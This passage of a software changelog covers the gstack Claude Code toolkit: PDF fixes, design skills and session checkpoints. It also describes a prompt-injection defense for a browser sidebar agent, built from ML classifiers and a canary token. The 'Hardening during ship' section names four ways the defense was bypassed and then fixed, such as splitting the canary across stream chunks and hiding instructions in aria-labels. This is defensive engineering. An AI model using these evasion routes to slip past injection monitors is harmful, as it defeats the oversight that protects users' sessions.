- F1 (dual-listener refactor) is bisected as four commits on the branch: rate-limit loosening, new `tunnel-denial-log` module, the server.ts refactor, and the new source-level test suite. Each commit is independently green. Subsequent wave items rebase onto F1 cleanly.
- Credits: @garagon (critical bug surface in PR #1026 plus SSRF, envelope, DOM-channel coverage, and --from-file PRs), @Hybirdss (PR #1002 concept, superseded by F1 but informed the policy model), @HMAKT99 (PRs #469 and #472 — both ended up already-landed-on-main; credit for surfacing the issues), @theqazi (2 commits from #1073, skills portion deferred pending internal voice review per CLAUDE.md).
- Codex-reviewed plan stored at `~/.gstack/projects/garrytan-gstack/ceo-plans/2026-04-21-security-wave-v1.5.2.md`. Eng-review test plan at `~/.gstack/projects/garrytan-gstack/garrytan-garrytan-sec-wave-eng-review-test-plan-*.md`.
- Non-goal tracked as #1136: switch cookie-import-browser CDP transport from TCP `--remote-debugging-port` to `--remote-debugging-pipe` so the Windows v20 ABE elevation path is closed. Non-trivial (Playwright doesn't expose the pipe transport; needs a minimal CDP-over-pipe client); intentionally deferred from this wave.

## [1.5.1.0] - 2026-04-20

## **Three visible bugs in v1.4.0.0 /make-pdf, all fixed.**

Page footers showed "6 of 8" twice on every page because Chromium's native footer and our print CSS were both rendering numbers. A markdown title containing `&` rendered as `Faber &amp;amp; Faber` in `<title>` and TOC entries, because the extractors stripped tags but forgot to decode entities. On Linux (Docker, CI, servers), body text fell through to DejaVu Sans because neither Helvetica nor Arial is installed by default, and nothing in the font stack caught that. This release fixes all three and extends the fix beyond the obvious symptom each time.

### The numbers that matter

All three bugs were caught and expanded in review before any code was written. The plan went through `/plan-eng-review` (Claude), then `/codex` (outside voice), then implementation. Source: `.github/docker/Dockerfile.ci` (Linux fonts), `make-pdf/test/render.test.ts` (17 new tests), `git log main..HEAD` (this branch).

| Surface | Before (v1.4.0.0) | After (v1.5.1.0) |
|---------|-------------------|-----------------|
| Page footer | "6 of 8" stacked twice | "6 of 8" once |
| `# Faber & Faber` in `<title>` | `Faber &amp;amp; Faber` | `Faber &amp; Faber` |
| TOC entry with `&` | Double-escaped | Single-escaped |
| `&#169;` (copyright) in H1 | Broken | Decodes to `©` |
| `--no-page-numbers` CLI flag | Silently did nothing | Actually suppresses page numbers |
| `--footer-template` | Layered CSS page numbers on top | Custom footer wins cleanly |
| Linux PDF body font | DejaVu Sans (wrong) | Liberation Sans (metric-compatible Helvetica clone) |

| Review layer | Findings | Outcome |
|--------------|----------|---------|
| `/plan-eng-review` (Claude) | 1 architectural gap | expanded Bug 1 scope to include CSS-side conditional |
| `/codex` (outside voice) | 11 findings | 11 incorporated (data flow, TOC site, decoder collision, footer semantic, test contract, scope boundaries, font dependency) |
| Cross-model agreement rate | ~30% | Codex found 7 issues Claude's eng review missed by staying too high-altitude |

The agreement rate is the tell. One reviewer was not enough on this diff. Codex caught that my original "one-line fix" for Bug 1 would have left the `--no-page-numbers` CLI flag silently dead, because `RenderOptions` didn't carry `pageNumbers` and the orchestrator's `render()` call didn't pass it. Without the second opinion, the CLI flag ships broken again.

### What this means for anyone generating PDFs

Page numbers are now controlled by one flag from CLI to CSS, with the custom-footer semantic restored. Titles, cover pages, and TOC entries render HTML entities correctly, including numeric entities like `&#169;`. Linux environments no longer need to know about fonts-liberation — the Dockerfile installs it explicitly and a build-time `fc-match` check fails the image if the font disappears. Run `bun run dev make-pdf <file.md> --cover --toc` on Mac, and now also inside Docker, and the output looks the same.

### Itemized changes

#### Fixed

- **Page numbers no longer render twice on every page.** Chromium's native footer used to layer on top of our `@page @bottom-center` CSS. Now CSS is the single source of truth; Chromium native numbering is off unconditionally.
- **`--no-page-numbers` works end-to-end.** The CLI flag now reaches the CSS layer via `RenderOptions.pageNumbers`. Previously it died at the orchestrator and the CSS kept rendering numbers regardless.
- **`--footer-template` cleanly replaces the stock footer.** Passing a custom footer now also suppresses the CSS page numbers, preserving the original "custom footer wins" semantic that existed before Bug 1 collided with it.
- **HTML entities in titles, cover pages, and TOC entries render correctly.** A markdown heading like `# Faber & Faber` renders as `Faber &amp; Faber` in `<title>` (single-escaped) instead of `Faber &amp;amp; Faber` (double-escaped). Covers both extractor call sites: `extractFirstHeading` (title + cover) and `extractHeadings` (TOC).
- **Numeric HTML entities decode too.** `&#169;` in an H1 now renders as `©` in the PDF title. Decimal and hex numeric entities both supported.
- **Linux PDFs render in Liberation Sans instead of DejaVu Sans.** Font stacks in all four print-CSS slots (body, running header, page number, CONFIDENTIAL label) now include `"Liberation Sans"` between Helvetica and Arial. Metric-compatible, SIL OFL 1.1, installs via `fonts-liberation`.

#### Changed

- `.github/docker/Dockerfile.ci` installs `fonts-liberation` + `fontconfig` explicitly with retries, runs `fc-cache -f`, and verifies `fc-match "Liberation Sans"` in the final build step. Previously relied on Playwright's `install-deps` pulling it in transitively, which could silently regress on upgrade.
- `SKILL.md.tmpl` documents the Linux font dependency for users who install outside CI/Docker.

#### For contributors

- New helper `decodeTextEntities` in `render.ts` (distinct from existing `decodeTypographicEntities`, which intentionally preserves `&amp;` in pipeline HTML where `&amp;amp;` can be legitimate). Use the new one when extracting plain text destined for `<title>`, cover, or TOC.
- `PrintCssOptions.pageNumbers` wraps the `@bottom-center` rule in a conditional matching the existing `showConfidential` pattern. Thread `pageNumbers` through `RenderOptions` and forward from `orchestrator.ts` into both `render()` call sites (generate + preview).
- 17 new tests in `make-pdf/test/render.test.ts`: `printCss` pageNumbers isolation (3), `render()` data flow with footerTemplate (4), parameterized entity contracts across `&`, `<`, `>`, `©`, `—` (5), `<title>` exact single-escape assertion, TOC single-escape, numeric entity decode, smartypants-interacts contract, Liberation Sans body + @page box coverage (2).
- Known test gaps (small, future PR): hex numeric entity path, amp-last ordering with double-encoded input, SKILL.md Linux note content assertion. Orchestrator → `browseClient.pdf({pageNumbers: false})` and orchestrator → `render()` forwarding are covered transitively via the CSS end-to-end tests, not asserted directly.

## [1.5.0.0] - 2026-04-20

## **Your sidebar agent now defends itself against prompt injection.**

Open a web page with hidden malicious instructions, gstack's sidebar doesn't just trust that Claude will do the right thing. A 22MB ML classifier bundled with the browser scans every page you load, every tool output, every message you send. If it looks like a prompt injection attack, the session stops before Claude executes anything dangerous. A secret canary token in the system prompt catches attempts to exfil your session, if that token shows up anywhere in Claude's output, tool arguments, URLs, or file writes, the session terminates and you see exactly which layer fired and at what confidence. Attempts go to a local log you can read, and optionally to aggregate community telemetry so every gstack user becomes a sensor for defense improvements.

### What changes for you

Open the Chrome sidebar and you'll see a small `SEC` badge in the top right. Green means the full defense stack is loaded. Amber means something degraded (model warmup still running on first-ever use, about 30s). Red means the security module itself crashed and you're running on architectural controls only. Hover for per-layer detail.

If an attack fires, a centered alert-heavy banner appears, "Session terminated, prompt injection detected from {domain}". Expand "What happened" and you see the exact classifier scores. Restart with one click. No mystery.

### The numbers

| Metric | Before v1.4 | After v1.4 |
|---|---|---|
| Defense layers | 4 (content-security.ts) | **8** (adds ML content, ML transcript, canary, verdict combiner) |
| Attack channels covered by canary | 0 | **5** (text stream, tool args, URLs, file writes, subprocess args) |
| First-party classifier cost | none | **$0** (bundled, runs locally) |
| Model size shipped | 0 | **22MB** (TestSavantAI BERT-small, int8 quantized) |
| Optional ensemble model | none | **721MB DeBERTa-v3** (opt-in via `GSTACK_SECURITY_ENSEMBLE=deberta`) |
| BLOCK decision rule | none | **2-of-2 ML agreement** (or 2-of-3 with ensemble), prevents single-classifier false positives from killing sessions |
| Tests covering security surface | 12 | **280** (25 foundation + 23 adversarial + 10 integration + 9 classifier + 7 Playwright + 3 bench + 6 bun-native + 15 source-contracts + 11 adversarial-fix regressions + others) |
| Attack telemetry aggregation | local file only | **community-pulse edge function + gstack-security-dashboard CLI** |

### What actually ships

* **security.ts** — canary injection plus check, verdict combiner with ensemble rule, attack log with rotation, cross-process session state, device-salted payload hashing
* **security-classifier.ts** — TestSavantAI (default) plus Claude Haiku transcript check plus opt-in DeBERTa-v3 ensemble, all with graceful fail-open
* **Pre-spawn ML scan** on every user message plus tool output scan on every Read, Glob, Grep, WebFetch, Bash result
* **Shield icon** with 3 states (green, amber, red) updating continuously via `/sidebar-chat` poll
* **Canary leak banner** (centered alert-heavy, per approved design mockup) with expandable layer-score detail
* **Attack telemetry** via existing `gstack-telemetry-log` to `community-pulse` to Supabase pipe (tier-gated, community uploads, anonymous local-only, off is no-op)
* **`gstack-security-dashboard` CLI** — attacks detected last 7 days, top attacked domains, layer distribution, verdict split
* **BrowseSafe-Bench smoke harness** — 200 cases from Perplexity's 3,680-case adversarial dataset, cached hermetically, gates on signal separation
* **Live Playwright integration test** pins the L1 through L6 defense-in-depth contract
* **Bun-native classifier research skeleton** plus design doc — WordPiece tokenizer matching transformers.js output, benchmark harness, FFI roadmap for future 5ms native inference

### Hardening during ship

Two independent adversarial reviewers (Claude subagent and Codex/gpt-5.4) converged on four bypass paths. All four fixed before merge:

* **Canary stream-chunk split** — rolling-buffer detection across consecutive `text_delta` and `input_json_delta` events. Previously `.includes()` ran per-chunk, so an attacker could ask Claude to emit the canary split across two deltas and evade the check.
* **Snapshot command bypass** — `$B snapshot` emits ARIA-name output from the page, but was missing from `PAGE_CONTENT_COMMANDS`, so malicious aria-labels flowed to Claude without the trust-boundary envelope every other read path gets.
* **Tool-output single-layer BLOCK** — `combineVerdict` now accepts `{ toolOutput: true }`. On tool-result scans the Stack Overflow FP concern doesn't apply (content wasn't user-authored), so a single ML classifier at BLOCK threshold now blocks directly instead of degrading to WARN.
* **Transcript classifier tool-output context** — Haiku previously saw only `user_message + tool_calls` (empty input) on tool-result scans, so only testsavant_content got a signal. Now receives the actual tool output text and can vote.

Also: attribute-injection fix in `escapeHtml` (escapes `"` and `'` now), `GSTACK_SECURITY_OFF=1` is now a real gate in `loadTestsavant`/`loadDeberta` (not just a doc promise), device salt cached in-process so FS-unwritable environments don't break hash correlation, tool-use registry entries evicted on `tool_result` (memory leak fix), dashboard uses `jq` for brace-balanced JSON parse when available.

### Haiku transcript classifier unbroken (silent bug + gate removal)

The transcript classifier (`checkTranscript` calling `claude -p --model haiku`) was shipping dead. Two bugs:

1. Model alias `haiku-4-5` returned 404 from the CLI. Correct shorthand is `haiku` (resolves to `claude-haiku-4-5-20251001` today, stays on the latest Haiku as models roll).
2. The 2-second timeout was below the floor. Fresh `claude -p` spawn has ~2-3s CLI cold start + 5-12s inference on ~1KB prompts. At 2s every call timed out. Bumped to 15s.

Compounding the dead classifier: `shouldRunTranscriptCheck` gated Haiku on any other layer firing at `>= LOG_ONLY`. On the ~85% of BrowseSafe-Bench attacks that L4 misses (TestSavantAI recall is ~15% on browser-agent-specific attacks), Haiku never got a chance to vote. We were gating our best signal on our weakest. For tool outputs this gate is now removed — L4 + L4c + Haiku always run in parallel.

Review-on-BLOCK UX (centered alert-heavy banner with suspected text excerpt + per-layer scores + Allow / Block session buttons) lands alongside so false positives are recoverable instead of session-killing.

### Measured: BrowseSafe-Bench (200-case smoke)

Same 200 cases, before and after the fixes above:

| | L4-only (before) | Ensemble with Haiku (after) |
|---|---|---|
| Detection rate | 15.3% | **67.3%** |
| False-positive rate | 11.8% | 44.1% |
| Runtime | ~90s | ~41 min (Haiku is the long pole) |

**4.4x lift in detection.** FP rate also climbed 3.7x — Haiku is more aggressive and fires on edge cases that TestSavantAI smiles through. The review banner makes those FPs recoverable: user sees the suspected excerpt + layer scores, clicks Allow once, session continues. A P1 follow-up is tuning the Haiku WARN threshold (currently 0.6, probably should be 0.7-0.85) against real-world attempts.jsonl data once gstack users start reporting.

Honest shipping posture: this is meaningfully safer than v1.3.x, not bulletproof. Canary (deterministic), content-security L1-L3 (structural), and the review banner remain the load-bearing defenses when the ML layers miss or over-fire.

### Env knobs

* `GSTACK_SECURITY_OFF=1` — emergency kill switch (canary still injected, ML skipped)
* `GSTACK_SECURITY_ENSEMBLE=deberta` — opt-in 721MB DeBERTa-v3 ensemble classifier for 2-of-3 agreement

### For contributors

Supabase migration `004_attack_telemetry.sql` adds five nullable columns to `telemetry_events` (`security_url_domain`, `security_payload_hash`, `security_confidence`, `security_layer`, `security_verdict`) plus two partial indices for dashboard aggregation. `community-pulse` edge function aggregates the security section. Run `cd supabase && ./verify-rls.sh` and deploy via your normal Supabase deploy flow.

---

## [1.4.0.0] - 2026-04-20

## **Turn any markdown file into a PDF that looks finished.**

The new `/make-pdf` skill takes a `.md` file and produces a publication-quality PDF. 1 inch margins. Helvetica. Page numbers in the footer. Running header with the doc title. Curly quotes, em dashes, ellipsis (…). Optional cover page. Optional clickable table of contents. Optional diagonal DRAFT watermark. Copy any paragraph out of the PDF and paste it into a Google Doc: it pastes as one clean block, not "S a i l i n g" spaced out letter by letter. That last part is the whole game. Most markdown-to-PDF tools produce output that reads like a legal document run through a scanner three times. This one reads like a real essay or a real letter.

### What you can do now

- `$P generate letter.md` writes a clean letter PDF to `/tmp/letter.pdf` with sensible defaults.
- `$P generate --cover --toc --author "Garry Tan" --title "On Horizons" essay.md essay.pdf` adds a left-aligned cover page (title, subtitle, date, hairline rule) and a TOC from your H1/H2/H3 headings.
- `$P generate --watermark DRAFT memo.md draft.pdf` overlays a diagonal DRAFT watermark on every page. Send as draft. Drop the flag when it's final.
- `$P generate --no-chapter-breaks memo.md` disables the default "every H1 starts a new page" behavior for memos that happen to have multiple top-level headings.
- `$P generate --allow-network essay.md` lets external images load. Off by default so someone else's markdown can't phone home through a tracking pixel when you generate their PDF.
- `$P preview essay.md` renders the same HTML and opens it in your browser. Refresh as you edit. Skip the PDF round trip until you're ready.
- `$P setup` verifies browse + Chromium + pdftotext are installed and runs an end-to-end smoke test.

### Why the text actually copies cleanly

Headless Chromium emits per-glyph `Tj` operators for webfonts with non-standard metrics tables. That's why every other "markdown to PDF" tool produces PDFs where copy-paste turns "Sailing" into "S a i l i n g". We ship with system Helvetica for everything ... Chromium has native metrics for it and emits clean word-level `Tj` operators. The CI matrix runs a combined-features fixture (smartypants + hyphens + ligatures + bold/italic + inline code + lists + blockquote + chapter breaks, all on) through `pdftotext` and asserts the extracted text matches a handwritten expected file. If any feature breaks extraction, the gate fails.

### Under the hood

make-pdf shells out to `browse` for Chromium lifecycle. No second Playwright install, no second 58MB binary, no second codesigning dance. `$B pdf` grew from "take a screenshot as A4" into a real PDF engine with `--format`/`--width`/`--height`, `--margins`, `--header-template`/`--footer-template`, `--page-numbers`, `--tagged`, `--outline`, `--toc`, `--tab-id`, and `--from-file` for large payloads (Windows argv caps). `$B load-html` and `$B js` got `--tab-id` too, so parallel `$P generate` calls never race on the active tab. `$B newtab --json` returns structured output so make-pdf can parse the tab ID without regex-matching log strings.

### For contributors

- Skill file: `make-pdf/SKILL.md.tmpl`. Binary source: `make-pdf/src/`. Test fixtures: `make-pdf/test/fixtures/`. CI workflow: `.github/workflows/make-pdf-gate.yml`.
- New resolver `{{MAKE_PDF_SETUP}}` emits the `$P=` alias with the same discovery order as `$B`: `MAKE_PDF_BIN` env override, then local skill root, then global install, then PATH.
- Combined-features copy-paste gate is the P0 test in `make-pdf/test/e2e/combined-gate.test.ts`. Per-feature gates are P1 diagnostics.
- Phase 4 deferrals: vendored Paged.js for accurate TOC page numbers, vendored highlight.js for syntax highlighting, drop caps, pull quotes, CMYK safe conversion, two-column layout.
- Preamble bash now emits `_EXPLAIN_LEVEL` and `_QUESTION_TUNING` so downstream skills can read them at runtime. Golden-file fixtures updated to match.

## [1.3.0.0] - 2026-04-19

## **Your design skills learn your taste.**
## **Your session state becomes files you can grep, not a black box.**

v1.3 is about the things you do every day. `/design-shotgun` now remembers which fonts, colors, and layouts you approve across sessions, so the next round of variants leans toward your actual taste instead of resetting to Inter every time. `/design-consultation` has a "would a human designer be embarrassed by this?" self-gate in Phase 5 and a "what's the one thing someone will remember?" forcing question in Phase 1, AI-slop output gets discarded before it reaches you. `/context-save` and `/context-restore` write session state to plaintext markdown in `~/.gstack/projects/$SLUG/checkpoints/`, you can read and edit and move between machines. Flip on continuous checkpoint mode (`gstack-config set checkpoint_mode continuous`) and it also drops `WIP:` commits with structured `[gstack-context]` bodies into your git log. Claude Code already manages its own session state, this is a parallel track you control, in formats you own.

### The numbers that matter

Setup: these come from the v1.3 feature surface. Reproducible via `grep "Generate a different" design-shotgun/SKILL.md.tmpl`, `ls model-overlays/`, `cat bin/gstack-taste-update` for the schema, and `gstack-config get checkpoint_mode` for the runtime wiring.

| Metric                                           | BEFORE v1.3                 | AFTER v1.3                              | Δ           |
|--------------------------------------------------|------------------------------|-----------------------------------------|-------------|
| **Design-variant convergence gate**              | no requirement               | **3 axes required** (font + palette + layout must differ) | **+3**  |
| **AI-slop font blacklist**                       | ~8 fonts                     | **10+** (added Space Grotesk, system-ui as primary) | **+2+** |
| **Taste memory across `/design-shotgun` rounds** | none                         | **per-project JSON, 5%/wk decay**       | **new**     |
| **Session state format**                         | Claude Code's opaque session store | **markdown in `~/.gstack/` by default, plus `WIP:` git commits if you opt into continuous mode** (parallel track) | **new** |
| **`/context-restore` sources**                   | markdown files only          | **markdown + `[gstack-context]` from WIP commits** | **+1** |
| **Models with behavioral overlays**              | 1 (Claude implicit)          | **5** (claude, gpt, gpt-5.4, gemini, o-series) | **+4** |

The single most striking row: session state stops being a black box. Claude Code's built-in session management works fine on its own terms, but you can't `grep` it, you can't read it, you can't hand it to a different tool. `/context-save` writes markdown to `~/.gstack/projects/$SLUG/checkpoints/` you can open in any editor. Continuous mode (opt-in) also drops `WIP:` commits with structured `[gstack-context]` bodies into your git log, so `git log --grep "WIP:"` shows the whole thread. Either way, plain text you own, not a proprietary store.

### What this means for gstack users

If you're a solo builder or founder shipping a product one sprint at a time, `/design-shotgun` stops handing you the same four variants every time and starts learning which ones you pick. `/design-consultation` stops defaulting to Inter + gray + rounded-corners and forces itself to answer "what's memorable?" before it finishes. `/context-save` and `/context-restore` give you a parallel, inspectable record of session state that lives alongside Claude Code's own, markdown files in your home directory by default, plus git commits if you opt into continuous mode. When you need to hand work off to a different tool or just review what your agent actually decided, you open a file or read `git log`. Run `/gstack-upgrade`, try `/design-shotgun` on your next landing page, and approve a variant so the taste engine has a starting signal.

### Itemized changes

### Added

#### Design skills that stop looking like AI

- **Anti-slop design constraints.** `/design-consultation` now asks "What's the one thing someone will remember?" as a forcing question in Phase 1, and runs a "Would a human designer be embarrassed by this?" self-gate in Phase 5 — output that fails the gate gets discarded and regenerated. `/design-shotgun` gets an anti-convergence directive: each variant must use a different font, palette, and layout, or one of them failed. Space Grotesk (the new "safe alternative to Inter") added to the overused-fonts list. `system-ui` as a primary font added to the AI-slop blacklist.
- **Design taste engine.** Your approvals and rejections in `/design-shotgun` get written to a persistent per-project taste profile at `~/.gstack/projects/$SLUG/taste-profile.json`. Tracks fonts, colors, layouts, and aesthetic directions with Laplace-smoothed confidence. Decays 5% per week so stale preferences fade. `/design-consultation` and `/design-shotgun` both factor in your demonstrated preferences on future runs, so variant #3 this month remembers what you liked in variant #1 last month.

#### Session state you can see, grep, and move

- **Continuous checkpoint mode (opt-in, local by default).** Flip it on with `gstack-config set checkpoint_mode continuous` and skills auto-commit your work with `WIP: <description>` prefix and a structured `[gstack-context]` body (decisions made, remaining work, failed approaches) directly into your project's git log. Runs alongside Claude Code's built-in session management and alongside the default `/context-save` markdown files in `~/.gstack/`. The git-based track is useful when you want `git log --grep "WIP:"` to show you the whole reasoning thread on a branch, or when you want to review what your agent did without opening a file. Push is opt-in via `checkpoint_push=true`, default is local-only so you don't accidentally trigger CI on every WIP commit.
- **`/context-restore` reads WIP commits.** In addition to the markdown saved-context files, `/context-restore` now parses `[gstack-context]` blocks from WIP commits on the current branch. When you want to pick up where you left off with structured decisions and remaining-work in view, it's right there.
- **`/ship` non-destructively squashes WIP commits** before creating the PR. Uses `git rebase --autosquash` scoped to WIP commits only. Non-WIP commits on the branch are preserved. Aborts on conflict with a `BLOCKED` status instead of destroying real work. So you can go wild with `WIP:` commits all week and still ship a clean bisectable PR.

#### Quality-of-life

- **Feature discovery prompt after upgrade.** When `JUST_UPGRADED` fires, gstack offers to enable new features once per user (per-feature marker files at `~/.gstack/.feature-prompted-{name}`). Skipped entirely in spawned sessions. No more silent features that never get discovered.
- **Context health soft directive (T2+ skills).** During long-running skills (`/qa`, `/investigate`, `/cso`), gstack now nudges you to write periodic `[PROGRESS]` summaries. If you notice you're going in circles, STOP and reassess. Self-monitoring for 50+ tool-call sessions. No fake thresholds, no enforcement. Progress reports never mutate git state.

#### Cross-host support

- **Per-model behavioral overlays via `--model` flag.** Different LLMs need different nudges. Run `bun run gen:skill-docs --model gpt-5.4` and every generated skill picks up GPT-tuned behavioral patches. Five overlays ship in `model-overlays/`: claude (todo-list discipline), gpt (anti-termination + completeness), gpt-5.4 (anti-verbosity, inherits gpt), gemini (conciseness), o-series (structured output). Overlay files are plain markdown — edit in place, no code changes. `MODEL_OVERLAY: {model}` prints in the preamble output so you know which one is active.

#### Config

- **`gstack-config list` and `defaults`** subcommands. `list` shows all config keys with current value AND source (user-set vs default). `defaults` shows the defaults table. Fixes the prior gap where `get` returned empty for missing keys instead of falling back to the documented defaults.
- **`checkpoint_mode` and `checkpoint_push` config keys.** New knobs for continuous checkpoint mode. Both default to safe values (`explicit` mode, no auto-push).

#### Power-user / internal

- **`gstack-model-benchmark` CLI + `/benchmark-models` skill.** Run the same prompt across Claude, GPT (via Codex CLI), and Gemini side-by-side. Compares latency, tokens, cost, and optionally output quality via an Anthropic SDK judge (`--judge`, ~$0.05/run). Per-provider auth detection, pricing tables, tool-compatibility map, parallel execution, per-provider error isolation. Output as table / JSON / markdown. `--dry-run` validates flags + auth without spending API calls. `/benchmark-models` wraps the CLI in an interactive flow (pick prompt → confirm providers → decide on judge → run → interpret) for when you want to know "which model is actually best for my `/qa` skill" with data instead of vibes.

### Changed

- **Preamble split into submodules.** `scripts/resolvers/preamble.ts` was 740 lines with 18 generators inline. Now it's a ~100-line composition root that imports each generator from `scripts/resolvers/preamble/*.ts`. Output is byte-identical (verified via `diff -r` on all 135 generated SKILL.md files across all hosts before and after the refactor). Maintenance gets easier: adding a new preamble section is now "create one file, add one import line" instead of "find a spot in the god-file." This also absorbs main's v1.1.2 mode-posture and v1.0 writing-style additions as submodules (`generate-writing-style.ts`, `generate-writing-style-migration.ts`).
- **Anti-slop dead code removed.** `scripts/gen-skill-docs.ts` had a duplicate copy of `AI_SLOP_BLACKLIST`, `OPENAI_HARD_REJECTIONS`, and `OPENAI_LITMUS_CHECKS`. Deleted — `scripts/resolvers/constants.ts` is now the single source. No more drift risk.
- **Token ceiling raised from 25K to 40K.** Skills legitimately packing a lot of behavior (`/ship`, `/plan-ceo-review`, `/office-hours`) were tripping warnings that no longer reflect real risk given today's 200K-1M context windows and prompt caching. CLAUDE.md's guidance reframes the ceiling as a "watch for runaway growth" signal rather than a forcing compression target.

### Fixed

- **Codex adapter works in temp working directories.** The GPT adapter (via `codex exec`) now passes `--skip-git-repo-check` so benchmarks running in non-git temp dirs stop hitting "Not inside a trusted directory" errors. `-s read-only` stays the safety boundary; the flag only skips the interactive trust prompt.
- **`--models` list deduplication.** Passing `--models claude,claude,gpt` no longer runs Claude twice and double-bills. The flag parser dedupes via Set while preserving first-occurrence order.
- **CI Docker build on Ubicloud runners.** Two fixes merged during the branch's life: (1) switched the Node.js install from NodeSource apt to direct download of the official nodejs.org tarball, since Ubicloud runners regularly couldn't reach archive.ubuntu.com / security.ubuntu.com; (2) added `xz-utils` to the system deps so `tar -xJ` on the `.tar.xz` tarball actually works.

### For contributors

- **Test infrastructure for multi-provider benchmarking.** `test/helpers/providers/{types,claude,gpt,gemini}.ts` defines a uniform `ProviderAdapter` interface and three adapters wrapping the existing CLI runners. `test/helpers/pricing.ts` has per-model cost tables (update quarterly). `test/helpers/tool-map.ts` declares which tools each provider's CLI exposes — benchmarks that need Edit/Glob/Grep correctly skip Gemini and report `unsupported_tool`.
- **Model taxonomy in neutral `scripts/models.ts`.** Avoids an import cycle through `hosts/index.ts` that would have happened if `Model` lived in `scripts/resolvers/types.ts`. `resolveModel()` handles family heuristics: `gpt-5.4-mini` → `gpt-5.4`, `o3` → `o-series`, `claude-opus-4-7` → `claude`.
- **`scripts/resolvers/preamble/`** — 18 single-purpose generators, 16-160 lines each. The composition root in `scripts/resolvers/preamble.ts` imports them and wires them into the tier-gated section list.
- **Plan and reviews persisted.** Implementation followed `~/.claude/plans/declarative-riding-cook.md` which went through CEO review (SCOPE EXPANSION, 6 expansions accepted), DX review (POLISH, 5 gaps fixed), Eng review (4 architecture issues), and Codex review (11 brutal findings, all integrated and 2 prior decisions reversed).
- **Mode-posture energy in Writing Style rules 2-4** (ported from main's v1.1.2.0). Rule 2 and rule 4 now cover three framings — pain reduction, capability unlocked, forcing-question pressure — so expansion, builder, and forcing-question skills keep their edge instead of collapsing into diagnostic-pain framing. Rule 3 adds an explicit exception for stacked forcing questions. Came in via the merge; sits on top of the submodule refactor already shipped in v1.3.
- **Lite E2E coverage for v1.3 primitives.** Three new test files fill the real coverage gaps flagged in initial review: `test/taste-engine.test.ts` (24 tests — schema shape, Laplace-smoothed confidence, 5%/week decay clamped at 0, multi-dimension extraction, case-insensitive first-casing-wins policy, session cap via seed-then-one-call, legacy profile migration, taste-drift conflict warning, malformed-JSON recovery), `test/benchmark-cli.test.ts` (12 tests — CLI flag wiring, provider defaults, unknown-provider WARN path, NOT-READY branch regression catcher that strips auth env vars), `test/skill-e2e-benchmark-providers.test.ts` (8 periodic-tier live-API tests — trivial "echo ok" prompt through claude/codex/gemini adapters, assertions on parsed output + tokens + cost + timeout error codes + Promise.allSettled parallel isolation).
- **Ship golden fixtures for three hosts.** `test/fixtures/golden/{claude,codex,factory}-ship-SKILL.md` — byte-exact regression pins on the `/ship` generated output. The adversarial subagent pass during /review caught two real bugs before merge: Geist/GEIST casing policy in the taste engine was unpinned, and the live-E2E workdir was created at module load and never cleaned up.

## [1.1.3.0] - 2026-04-19

### Changed
- **`/checkpoint` is now `/context-save` + `/context-restore`.** Claude Code treats `/checkpoint` as a native rewind alias in current environments, which was shadowing the gstack skill. Symptom: you'd type `/checkpoint`, the agent would describe it as a "built-in you need to type directly," and nothing would get saved. The fix is a clean rename and a split into two skills. One that saves, one that restores. Your old saved files still load via `/context-restore` (storage path unchanged).
  - `/context-save` saves your current working state (optional title: `/context-save wintermute`).
  - `/context-save list` lists saved contexts. Defaults to current branch; pass `--all` for every branch.
  - `/context-restore` loads the most recent saved context across ALL branches by default. This fixes a second bug where the old `/checkpoint resume` flow was getting cross-contaminated with list-flow filtering and silently hiding your most recent save.
  - `/context-restore <title-fragment>` loads a specific saved context.
- **Restore ordering is now deterministic.** "Most recent" means the `YYYYMMDD-HHMMSS` prefix in the filename, not filesystem mtime. mtime drifts during copies and rsync; filenames don't. Applied to both restore and list flows.

### Fixed
- **Empty-set bug on macOS.** If you ran `/checkpoint resume` (now `/context-restore`) with zero saved files, `find ... | xargs ls -1t` would fall back to listing your current directory. Confusing output, no clean "no saved contexts yet" message. Replaced with `find | sort -r | head` so empty input stays empty.

### For contributors
- New `gstack-upgrade/migrations/v1.1.3.0.sh` removes the stale on-disk `/checkpoint` install so Claude Code's native `/rewind` alias is no longer shadowed. Ownership-guarded across three install shapes (directory symlink into gstack, directory with SKILL.md symlinked into gstack, anything else). User-owned `/checkpoint` skills preserved with a notice. Migration hardened after adversarial review: explicit `HOME` unset/empty guard, `realpath` with python3 fallback, `rm --` flag, macOS sidecar handling.
- `test/migration-checkpoint-ownership.test.ts` ships 7 scenarios covering all 3 install shapes + idempotency + no-op-when-gstack-not-installed + SKILL.md-symlink-outside-gstack. Free tier, ~85ms.
- Split `checkpoint-save-resume` E2E into `context-save-writes-file` and `context-restore-loads-latest`. The latter seeds two files with scrambled mtimes so the "filename-prefix, not mtime" guarantee is locked in.
- `context-save` now sanitizes the title in bash (allowlist `[a-z0-9.-]`, cap 60 chars) instead of trusting LLM-side slugification, and appends a random suffix on same-second collisions to enforce the append-only contract.
- `context-restore` caps its filename listing at 20 most-recent entries so users with 10k+ saved files don't blow the context window.
- `test/skill-e2e-autoplan-dual-voice.test.ts` was shipped broken on main (wrong `runSkillTest` option names, wrong result-field access, wrong helper signatures, missing Agent/Skill tools). Fixed end-to-end: 1/1 pass on first attempt, $0.68, 211s. Voice-detection regexes now match JSON-shaped tool_use entries and phase-completion markers, not bare prompt-text mentions.
- Added 8 live-fire E2E tests in `test/skill-e2e-context-skills.test.ts` that spawn `claude -p` with the Skill tool enabled and assert on the routing path, not hand-fed section prompts. Covers: save routing, save-then-restore round-trip, fragment-match restore, empty-state graceful message, `/context-restore list` delegation to `/context-save list`, legacy file compat, branch-filter default, and `--all` flag. 21 additional free-tier hardening tests in `test/context-save-hardening.test.ts` pin the title-sanitizer allowlist, collision-safe filenames, empty-set fallback, and migration HOME guard.
- New `test/skill-collision-sentinel.test.ts` — insurance policy against upstream slash-command shadowing. Enumerates every gstack skill name and cross-checks against a per-host list of known built-in slash commands (23 Claude Code built-ins tracked so far). When a host ships a new built-in, add it to `KNOWN_BUILTINS` and the test flags the collision before users find it. `/review` collision with Claude Code's `/review` documented in `KNOWN_COLLISIONS_TOLERATED` with a written justification; the exception list is validated against live skills on every run so stale entries fail loud.
- `runSkillTest` in `test/helpers/session-runner.ts` now accepts an `env:` option for per-test env overrides. Prevents tests from having to stuff `GSTACK_HOME=...` into the prompt, which was causing the agent to bypass the Skill tool. All 8 new E2E tests use `env: { GSTACK_HOME: gstackHome }`.

## [1.1.2.0] - 2026-04-19

### Fixed
